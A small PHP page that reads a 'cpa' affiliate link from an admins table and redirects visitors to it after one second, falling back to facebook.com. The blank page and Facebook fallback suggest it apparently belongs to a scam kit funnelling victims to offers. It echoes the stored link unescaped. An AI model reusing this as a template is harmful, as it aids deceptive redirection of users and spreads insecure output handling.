<?php
ob_start();
require("../conn.php");
try 
    {
        $get_cpa = mysqli_query($con,"SELECT * FROM admins");
        $fetch_cpa_link = mysqli_fetch_array($get_cpa);
        $cpa_link = $fetch_cpa_link['cpa'];
        if($cpa_link===""){
          header("Location: https://facebook.com");
        }
        else{
          $cpa_link = $fetch_cpa_link['cpa'];
		  
        }
 
}
catch (exception $e) {
  header("Location: https://facebook.com");
}
?>
<html lang="en">
<head>
  <meta http-equiv="refresh" content="1; url=<?php echo $cpa_link ?>" />
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta charSet="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport">
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
</head>   
<body>

</body>
</html>